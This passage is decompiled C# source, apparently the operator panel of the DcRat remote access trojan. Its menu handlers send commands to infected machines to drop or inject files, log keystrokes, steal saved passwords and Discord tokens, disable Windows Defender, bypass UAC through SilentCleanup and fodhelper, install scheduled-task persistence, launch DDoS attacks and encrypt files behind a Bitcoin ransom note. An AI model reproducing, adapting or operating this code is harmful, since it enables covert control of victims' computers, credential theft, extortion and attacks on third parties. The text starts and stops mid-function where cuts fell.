				if ((FormProcessManager)(object)Application.get_OpenForms().get_Item("processManager:" + clients.ID) == null)
				{
					FormProcessManager formProcessManager = new FormProcessManager();
					((Control)formProcessManager).set_Name("processManager:" + clients.ID);
					((Control)formProcessManager).set_Text("processManager:" + clients.ID);
					formProcessManager.F = this;
					formProcessManager.ParentClient = clients;
					((Control)formProcessManager).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			try
			{
				openFileDialog.set_Multiselect(true);
				if ((int)((CommonDialog)openFileDialog).ShowDialog() != 1)
				{
					return;
				}
				MsgPack packet = new MsgPack();
				packet.ForcePathObject("Pac_ket").AsString = "sendFile";
				packet.ForcePathObject("Update").AsString = "false";
				MsgPack msgpack = new MsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients client in selectedClients)
				{
					client.LV.set_ForeColor(Color.Red);
					string[] fileNames = ((FileDialog)openFileDialog).get_FileNames();
					foreach (string file in fileNames)
					{
						await Task.Run(delegate
						{
							packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
							packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
							msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
						});
						ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					}
				}
			}
			finally
			{
				((IDisposable)openFileDialog)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
			((Form)formSendFileToMemory).ShowDialog();
			if (formSendFileToMemory.IsOK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((ToolStripItem)formSendFileToMemory.toolStripStatusLabel1).get_Tag().ToString())));
				if (((ListControl)formSendFileToMemory.comboBox1).get_SelectedIndex() == 0)
				{
					msgPack.ForcePathObject("Inject").AsString = "";
				}
				else
				{
					msgPack.ForcePathObject("Inject").AsString = ((Control)formSendFileToMemory.comboBox2).get_Text();
				}
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendMemory.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					clients.LV.set_ForeColor(Color.Red);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
			((Form)formSendFileToMemory).Close();
			((Component)(object)formSendFileToMemory).Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("Message", "Message", "Controlled by DcRat", -1, -1);
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
				msgPack.ForcePathObject("Message").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormChat)(object)Application.get_OpenForms().get_Item("chat:" + clients.ID) == null)
				{
					FormChat formChat = new FormChat();
					((Control)formChat).set_Name("chat:" + clients.ID);
					((Control)formChat).set_Text("chat:" + clients.ID);
					formChat.F = this;
					formChat.ParentClient = clients;
					((Control)formChat).Show();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com", -1, -1);
			if (!string.IsNullOrEmpty(text))
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
				msgPack.ForcePathObject("URL").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (listView1.get_SelectedItems().get_Count() <= 0)
			{
				return;
			}
			OpenFileDialog val = new OpenFileDialog();
			try
			{
				((FileDialog)val).set_Filter("All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png");
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
					msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(((FileDialog)val).get_FileName()));
					msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(((FileDialog)val).get_FileName());
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Logger.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormKeylogger)(object)Application.get_OpenForms().get_Item("keyLogger:" + clients.ID) == null)
				{
					FormKeylogger formKeylogger = new FormKeylogger();
					((Control)formKeylogger).set_Name("keyLogger:" + clients.ID);
					((Control)formKeylogger).set_Text("keyLogger:" + clients.ID);
					formKeylogger.F = this;
					formKeylogger.FullPath = Path.Combine(Application.get_StartupPath(), "ClientsFolder", clients.ID, "Keylogger");
					((Control)formKeylogger).Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam", -1, -1);
			if (!string.IsNullOrEmpty(text))
			{
				lock (Settings.LockReportWindowClients)
				{
					Settings.ReportWindowClients.Clear();
					Settings.ReportWindowClients = new List<Clients>();
				}
				Settings.ReportWindow = true;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "run";
				msgPack.ForcePathObject("Title").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Settings.ReportWindow = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
			msgPack.ForcePathObject("Option").AsString = "stop";
			lock (Settings.LockReportWindowClients)
			{
				foreach (Clients reportWindowClient in Settings.ReportWindowClients)
				{
					ThreadPool.QueueUserWorkItem(reportWindowClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "close";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog val = new OpenFileDialog();
			try
			{
				if ((int)((CommonDialog)val).ShowDialog() == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(((FileDialog)val).get_FileName())));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(((FileDialog)val).get_FileName());
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients clients in selectedClients)
					{
						clients.LV.set_ForeColor(Color.Red);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			if (selectedClients.Length == 0)
			{
				Process.Start(Application.get_StartupPath());
				return;
			}
			Clients[] array = selectedClients;
			foreach (Clients clients in array)
			{
				string text = Path.Combine(Application.get_StartupPath(), "ClientsFolder\\" + clients.ID);
				if (Directory.Exists(text))
				{
					Process.Start(text);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "shutdown";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "logoff";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		FormBlockClients formBlockClients = new FormBlockClients();
		try
		{
			((Form)formBlockClients).ShowDialog();
		}
		finally
		{
			((IDisposable)formBlockClients)?.Dispose();
		}
	}

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		((Component)(object)notifyIcon1).Dispose();
		Environment.Exit(0);
	}

	private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		FormFileSearcher formFileSearcher = new FormFileSearcher();
		try
		{
			if ((int)((Form)formFileSearcher).ShowDialog() == 1 && listView1.get_SelectedItems().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
				msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.get_Value() * 1000L * 1000L;
				msgPack.ForcePathObject("Extensions").AsString = ((Control)formFileSearcher.txtExtnsions).get_Text();
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FileSearcher.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					clients.LV.set_ForeColor(Color.Red);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		finally
		{
			((IDisposable)formFileSearcher)?.Dispose();
		}
	}

	private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (listView1.get_SelectedItems().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "information";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Information.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (listView1.get_Items().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
				((Control)formDOS).Show();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890", -1, -1);
			if (!string.IsNullOrEmpty(text) && listView1.get_SelectedItems().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
				msgPack.ForcePathObject("Message").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Interaction.InputBox("Password", "Password", "", -1, -1);
			if (!string.IsNullOrEmpty(text) && listView1.get_SelectedItems().get_Count() > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
				msgPack.ForcePathObject("Password").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransomware.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0 || (int)MessageBox.Show((IWin32Window)(object)this, "Only for Admin.", "Disbale Defender", (MessageBoxButtons)4, (MessageBoxIcon)64) != 6)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() == "Admin")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormAudio)(object)Application.get_OpenForms().get_Item("Audio Recorder:" + clients.ID) == null)
				{
					FormAudio formAudio = new FormAudio();
					((Control)formAudio).set_Name("Audio Recorder:" + clients.ID);
					((Control)formAudio).set_Text("Audio Recorder:" + clients.ID);
					formAudio.F = this;
					formAudio.ParentClient = clients;
					formAudio.Client = clients;
					((Control)formAudio).Show();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uac";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.get_SubItems().get_Item(lv_admin.get_Index()).get_Text() != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Recovery.dll");
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Recovering...", Color.Black);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Discord.dll");
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		if (listView1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
			MsgPack msgPack2 = new MsgPack();
